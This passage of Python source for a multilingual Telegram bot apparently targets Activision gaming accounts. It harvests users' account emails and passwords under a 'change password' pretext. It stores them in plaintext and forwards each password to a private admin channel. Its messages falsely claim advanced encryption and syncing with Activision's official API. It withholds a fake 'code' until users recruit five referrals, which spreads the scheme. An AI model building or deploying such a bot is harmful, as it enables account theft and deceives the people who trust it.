            "<b>════════════════════════</b>\n\n"
            "📧 <b>Email:</b> <code>{email}</code>\n\n"
            "Пожалуйста, выберите раздел для редактирования:"
        ),
        'edit_email_btn': "📧 Изменить Email",
        'edit_pass_btn': "🔐 Изменить пароль",
        'back_btn': "🔙 Назад к списку аккаунтов",
        'enter_new_email': (
            "📧 <b>════════════════════════</b>\n"
            "      <b>Редактировать Email аккаунта</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Пожалуйста, отправьте новый действительный email.\n\n"
            "⚠️ Email должен быть точным и правильным."
        ),
        'enter_new_pass': (
            "🔐 <b>════════════════════════</b>\n"
            "      <b>Редактировать пароль аккаунта</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Пожалуйста, отправьте новый пароль.\n\n"
            "🔒 Ваша информация защищена продвинутым шифрованием."
        ),
        'edit_success': (
            "✅ <b>════════════════════════</b>\n"
            "      <b>Редактирование успешно завершено!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Информация вашего аккаунта успешно отредактирована.\n\n"
            "📡 Изменения также обновлены в системе официального API Activision.\n\n"
            "💡 Вы можете вернуться к списку ваших аккаунтов."
        ),
        'operation_cancelled': (
            "❌ <b>════════════════════════</b>\n"
            "      <b>Операция отменена</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Текущая операция успешно отменена.\n\n"
            "💡 Вы можете выбрать другой вариант из главного меню."
        ),
    }
}

# ================= دیتابیس =================
class DB:
    def __init__(self, db_name='bot.db'):
        self.db_name = db_name
    
    async def setup(self):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                lang TEXT,
                referrals INTEGER DEFAULT 0,
                referred_by INTEGER
            )''')
            await db.execute('''CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT,
                password TEXT,
                type TEXT,
                status TEXT DEFAULT 'pending',
                admin_msg_id INTEGER
            )''')
            await db.commit()
    
    async def get_lang(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r and r[0] else None
    
    async def set_lang(self, user_id, lang):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
            await db.commit()
    
    async def add_user(self, user_id, referrer_id=None):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("INSERT OR IGNORE INTO users (user_id, referred_by) VALUES (?, ?)", (user_id, referrer_id))
            await db.commit()
    
    async def add_referral(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
    
    async def get_referrals(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r else 0
    
    async def check_duplicate(self, user_id, email):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id FROM accounts WHERE user_id = ? AND email = ?", (user_id, email)) as c:
                return await c.fetchone() is not None
    
    async def add_account(self, user_id, email, password, type_str):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("INSERT INTO accounts (user_id, email, password, type) VALUES (?, ?, ?, ?)",
                                  (user_id, email, password, type_str)) as c:
                await db.commit()
                return c.lastrowid
    
    async def set_admin_msg_id(self, acc_id, msg_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET admin_msg_id = ? WHERE id = ?", (msg_id, acc_id))
            await db.commit()
    
    async def get_accounts(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id, email, password, type FROM accounts WHERE user_id = ?", (user_id,)) as c:
                return await c.fetchall()
    
    async def get_account(self, acc_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT user_id, email, password, type, admin_msg_id FROM accounts WHERE id = ?", (acc_id,)) as c:
                return await c.fetchone()
    
    async def update_account_email(self, acc_id, new_email):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET email = ? WHERE id = ?", (new_email, acc_id))
            await db.commit()
    
    async def update_account_pass(self, acc_id, new_pass):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET password = ? WHERE id = ?", (new_pass, acc_id))
            await db.commit()

db = DB()
router = Router()

# ================= FSM States =================
class St(StatesGroup):
    wait_email = State()
    wait_pass = State()
    wait_type = State()
    wait_edit_email = State()
    wait_edit_pass = State()

# ================= کیبوردها =================
def lang_select_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton(text="🇮🇷 فارسی", callback_data="lang_fa")],
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")]
    ])

def main_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text=T[l]['btn_my_accounts']),
                KeyboardButton(text=T[l]['btn_change_pass'])
            ],
            [
                KeyboardButton(text=T[l]['btn_points']),
                KeyboardButton(text=T[l]['btn_language'])
            ]
        ],
        resize_keyboard=True,
        is_persistent=True
    )

def cancel_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=T[l]['btn_cancel'])]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def join_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['join_btn'], url=f"https://t.me/{PUBLIC_CHANNEL_USERNAME}")],
        [InlineKeyboardButton(text=T[l]['check_join'], callback_data="check_join")]
    ])

def type_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['type_crack'], callback_data="type_crack")],
        [InlineKeyboardButton(text=T[l]['type_semi'], callback_data="type_semi")],
        [InlineKeyboardButton(text=T[l]['type_safe'], callback_data="type_safe")]
    ])

def approve_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ تأیید", callback_data=f"approve_{acc_id}")]
    ])

def get_code_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T['fa']['get_code'], callback_data=f"get_code_{acc_id}")]
    ])

def acc_list_kb(accounts, l):
    kb = []
    for acc in accounts:
        kb.append([InlineKeyboardButton(text=f"{acc[1]} ({acc[3]})", callback_data=f"edit_{acc[0]}")])
    kb.append([InlineKeyboardButton(text=T[l]['back_btn'], callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def edit_acc_kb(acc_id, l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['edit_email_btn'], callback_data=f"req_edit_email_{acc_id}")],
        [InlineKeyboardButton(text=T[l]['edit_pass_btn'], callback_data=f"req_edit_pass_{acc_id}")],
        [InlineKeyboardButton(text=T[l]['back_btn'], callback_data="my_accounts")]
    ])

def back_to_menu_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=T[l]['btn_back'])]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

# ================= توابع کمکی =================
async def check_mem(bot, uid):
    try:
        m = await bot.get_chat_member(PUBLIC_CHANNEL_ID, uid)
        return m.status not in ['left', 'kicked', 'restricted']
    except:
        return True

async def send_welcome(m: Message, l: str):
    if VIDEO_FILE_ID:
        try:
            await m.answer_video(VIDEO_FILE_ID, caption=T[l]['welcome'], reply_markup=main_kb(l))
        except Exception as e:
            print(f"Video error: {e}")
            await m.answer(T[l]['welcome'], reply_markup=main_kb(l))
    else:
        await m.answer(T[l]['welcome'], reply_markup=main_kb(l))

def get_button_key(text):
    for lang in ['fa', 'en', 'ru']:
        for key, val in T[lang].items():
            if key.startswith('btn_') and val == text:
                return key
    return None

# ================= هندلرها =================
@router.message(CommandStart())
async def start(m: Message, command: CommandObject, state: FSMContext):
    uid = m.from_user.id
    
    # Handle referral
    if command.args and command.args.startswith('ref_'):
        try:
            ref_id = int(command.args.split('_')[1])
            if ref_id != uid:
                await db.add_user(uid, ref_id)
                await db.add_referral(ref_id)
        except:
            await db.add_user(uid)
    else:
        await db.add_user(uid)
    
    l = await db.get_lang(uid)
    
    # If no language set, show language selection
    if l is None:
        await m.answer(T['en']['select_lang'], reply_markup=lang_select_kb())
        return
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await state.clear()
    await send_welcome(m, l)

@router.callback_query(F.data == "check_join")
async def cb_check_join(c: CallbackQuery):
    l = await db.get_lang(c.from_user.id)
    if await check_mem(bot, c.from_user.id):
        await c.message.delete()
        await send_welcome(c.message, l)
    else:
        await c.answer(T[l]['not_joined'], show_alert=True)

@router.callback_query(F.data.startswith("lang_"))
async def cb_lang(c: CallbackQuery):
    lang = c.data.split('_')[1]
    await db.set_lang(c.from_user.id, lang)
    await c.message.delete()
    
    if not await check_mem(bot, c.from_user.id):
        await c.message.answer(T[lang]['join_channel'], reply_markup=join_kb(lang))
    else:
        await send_welcome(c.message, lang)
    await c.answer()

# ================= هندلرهای FSM =================
@router.message(St.wait_email)
async def fsm_email(m: Message, state: FSMContext):
    # Check if user wants to cancel
    l = await db.get_lang(m.from_user.id)
    if m.text == T[l]['btn_cancel']:
        await state.clear()
        await m.answer(T[l]['operation_cancelled'], reply_markup=main_kb(l))
        return
    
    email = m.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        await m.answer(T[l]['invalid_email'])
        return
    
    if await db.check_duplicate(m.from_user.id, email):
        await state.clear()
        await m.answer(T[l]['duplicate_email'], reply_markup=main_kb(l))
        return
    
    await state.update_data(email=email)
    await state.set_state(St.wait_pass)
    await m.answer(T[l]['change_pass_step2'], reply_markup=cancel_kb(l))

@router.message(St.wait_pass)
async def fsm_pass(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    
    # Check if user wants to cancel
    if m.text == T[l]['btn_cancel']:
        await state.clear()
        await m.answer(T[l]['operation_cancelled'], reply_markup=main_kb(l))
        return
    
    await state.update_data(password=m.text.strip())
    await state.set_state(St.wait_type)
    
    # Send type selection with inline keyboard
    await m.answer(T[l]['change_pass_step3'], reply_markup=type_kb(l))

@router.callback_query(St.wait_type)
async def fsm_type(c: CallbackQuery, state: FSMContext):
    l = await db.get_lang(c.from_user.id)
    type_str = c.data.split('_')[1]
    
    data = await state.get_data()
    email = data.get('email')
    password = data.get('password')
    
    if not email or not password:
        await c.answer("خطا! لطفاً دوباره تلاش کنید.", show_alert=True)
        await state.clear()
        return
    
    acc_id = await db.add_account(c.from_user.id, email, password, type_str)
    
    # Send to admin channel
    admin_text = T[l]['admin_req'].format(
        user_id=c.from_user.id,
        email=email,
        password=password,
        type=type_str
    )
    admin_msg = await bot.send_message(PRIVATE_CHANNEL_ID, admin_text, reply_markup=approve_kb(acc_id))
    await db.set_admin_msg_id(acc_id, admin_msg.message_id)
    
    await state.clear()
    
    # Send success message with main menu
    await c.message.answer(T[l]['submitted'], reply_markup=main_kb(l))
    await c.answer("✅ ثبت شد!")

@router.message(St.wait_edit_email)
async def fsm_edit_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    
    # Check if user wants to cancel
    if m.text == T[l]['btn_cancel']:
        await state.clear()
        await m.answer(T[l]['operation_cancelled'], reply_markup=main_kb(l))
        return
    
    email = m.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        await m.answer(T[l]['invalid_email'])
        return
    
    data = await state.get_data()
    acc_id = data['edit_acc_id']
    
    await db.update_account_email(acc_id, email)
    
    # Update admin channel
    acc = await db.get_account(acc_id)
    admin_msg_id = acc[4]
    if admin_msg_id:
        try:
            admin_text = T[l]['admin_req'].format(
                user_id=m.from_user.id,
                email=email,
                password=acc[2],
                type=acc[3]
            )
            await bot.edit_message_text(admin_text, PRIVATE_CHANNEL_ID, admin_msg_id)
        except Exception as e:
            print(f"Failed to edit admin msg: {e}")
    
    await state.clear()
    await m.answer(T[l]['edit_success'], reply_markup=main_kb(l))

@router.message(St.wait_edit_pass)
async def fsm_edit_pass(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    
    # Check if user wants to cancel
    if m.text == T[l]['btn_cancel']:
        await state.clear()
        await m.answer(T[l]['operation_cancelled'], reply_markup=main_kb(l))
        return
    
    password = m.text.strip()
    
    data = await state.get_data()
    acc_id = data['edit_acc_id']
    
    await db.update_account_pass(acc_id, password)
    
    # Update admin channel
    acc = await db.get_account(acc_id)
    admin_msg_id = acc[4]
    if admin_msg_id:
        try:
            admin_text = T[l]['admin_req'].format(
                user_id=m.from_user.id,
                email=acc[1],
                password=password,
                type=acc[3]
            )
            await bot.edit_message_text(admin_text, PRIVATE_CHANNEL_ID, admin_msg_id)
        except Exception as e:
            print(f"Failed to edit admin msg: {e}")
    
    await state.clear()
    await m.answer(T[l]['edit_success'], reply_markup=main_kb(l))

# ================= هندلرهای اصلی منو =================
@router.message(F.text)
async def handle_menu(m: Message, state: FSMContext):
    key = get_button_key(m.text)
    if key is None:
        return
    
    uid = m.from_user.id
    l = await db.get_lang(uid)
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await state.clear()
    
    if key == 'btn_my_accounts':
        await show_my_accounts(m, l)
    elif key == 'btn_change_pass':
        await start_change_pass(m, l, state)
    elif key == 'btn_points':
        await show_points(m, l)
    elif key == 'btn_language':
        await m.answer(T[l]['select_lang'], reply_markup=lang_select_kb())
    elif key == 'btn_back':
        await send_welcome(m, l)

async def show_my_accounts(m: Message, l: str):
    accounts = await db.get_accounts(m.from_user.id)
    if not accounts:
        await m.answer(T[l]['no_accounts'], reply_markup=main_kb(l))
    else:
        text = T[l]['my_accounts_header'] + "\n\n" + T[l]['acc_list']
        for i, acc in enumerate(accounts, 1):
            text += f"\n{i}️⃣ 📧 {acc[1]}\n   🛡️ {acc[3]}\n"
        await m.answer(text, reply_markup=acc_list_kb(accounts, l))

async def start_change_pass(m: Message, l: str, state: FSMContext):
    await state.set_state(St.wait_email)
    await m.answer(T[l]['change_pass_step1'], reply_markup=cancel_kb(l))

async def show_points(m: Message, l: str):
    refs = await db.get_referrals(m.from_user.id)
    points = refs * 10
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{m.from_user.id}"
    
    text = T[l]['points_header'].format(points=points, refs=refs, link=link)
    await m.answer(text, reply_markup=main_kb(l))

# ================= هندلرهای ادمین =================
@router.callback_query(F.data.startswith("approve_"))
async def cb_approve(c: CallbackQuery):
    acc_id = int(c.data.split('_')[1])
    acc = await db.get_account(acc_id)
    if not acc:
        return
    
    user_id, email, password, type_str, admin_msg_id = acc
    l = await db.get_lang(user_id)
    
    # Send photo to user
    if PHOTO_FILE_ID:
        try:
            await bot.send_photo(
                user_id,
                PHOTO_FILE_ID,
                caption=T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
        except:
            await bot.send_message(
                user_id,
                T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
    else:
        await bot.send_message(
            user_id,
            T[l]['success_photo_caption'],
            reply_markup=get_code_kb(acc_id)
        )
    
    await c.message.edit_reply_markup(reply_markup=None)
    await c.answer("✅ Approved!")

@router.callback_query(F.data.startswith("get_code_"))
async def cb_get_code(c: CallbackQuery):
    acc_id = int(c.data.split('_')[2])
    l = await db.get_lang(c.from_user.id)
    refs = await db.get_referrals(c.from_user.id)
    
    if refs >= 5:
        # Generate or fetch code
        code = f"COD-{acc_id}-{c.from_user.id}-{int(asyncio.get_event_loop().time())}"
        await c.message.answer(
            f"🎉 <b>════════════════════════</b>\n"
            f"      <b>کد چنج شما آماده است!</b>\n"
            f"<b>════════════════════════</b>\n\n"
            f"🔑 <code>{code}</code>\n\n"
            f"⚠️ این کد فقط یکبار قابل استفاده است.\n\n"
            f"🏆 از اعتماد شما سپاسگزاریم!"
        )
    else:
        link = f"https://t.me/{BOT_USERNAME}?start=ref_{c.from_user.id}"
        await c.message.answer(T[l]['need_ref'].format(refs=refs, link=link))
    await c.answer()

# ================= هندلرهای ویرایش اکانت =================
@router.callback_query(F.data.startswith("edit_"))
async def cb_edit_acc(c: CallbackQuery):
    acc_id = int(c.data.split('_')[1])
    l = await db.get_lang(c.from_user.id)
    acc = await db.get_account(acc_id)
    if not acc or acc[0] != c.from_user.id:
        await c.answer("❌ Error", show_alert=True)
        return
    
    await c.message.edit_text(T[l]['edit_menu'].format(email=acc[1]), reply_markup=edit_acc_kb(acc_id, l))
    await c.answer()

@router.callback_query(F.data.startswith("req_edit_email_"))
async def cb_req_edit_email(c: CallbackQuery, state: FSMContext):
    acc_id = int(c.data.split('_')[3])
    await state.update_data(edit_acc_id=acc_id)
    await state.set_state(St.wait_edit_email)
    l = await db.get_lang(c.from_user.id)
    await c.message.answer(T[l]['enter_new_email'], reply_markup=cancel_kb(l))
    await c.answer()

@router.callback_query(F.data.startswith("req_edit_pass_"))
async def cb_req_edit_pass(c: CallbackQuery, state: FSMContext):
    acc_id = int(c.data.split('_')[3])
    await state.update_data(edit_acc_id=acc_id)
    await state.set_state(St.wait_edit_pass)
    l = await db.get_lang(c.from_user.id)
    await c.message.answer(T[l]['enter_new_pass'], reply_markup=cancel_kb(l))
    await c.answer()

@router.callback_query(F.data == "main_menu")
async def cb_main_menu(c: CallbackQuery, state: FSMContext):
    await state.clear()
    l = await db.get_lang(c.from_user.id)
    try:
        await c.message.delete()
    except:
        pass
    await send_welcome(c.message, l)
    await c.answer()

@router.callback_query(F.data == "my_accounts")
async def cb_my_accounts(c: CallbackQuery, state: FSMContext):
    await state.clear()
    l = await db.get_lang(c.from_user.id)
    try:
        await c.message.delete()
    except:
        pass
    await show_my_accounts(c.message, l)
    await c.answer()

# ================= Keep-Alive =================
async def keep_alive():
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.get(f"{RENDER_URL}/ping")
                print("Pinged Render to keep alive.")
            except Exception as e:
                print(f"Ping failed: {e}")
            await asyncio.sleep(300)

async def on_startup(app):
    await db.setup()
    await bot.set_webhook(f"{RENDER_URL}/webhook")
    asyncio.create_task(keep_alive())

def main():
    app = web.Application()
    app.router.add_get('/ping', lambda r: web.Response(text='OK'))
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path='/webhook')
    setup_application(app, dp, bot=bot)
    app.on_startup.append(on_startup)
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    dp = Dispatcher()
    dp.include_router(router)
    bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    main()
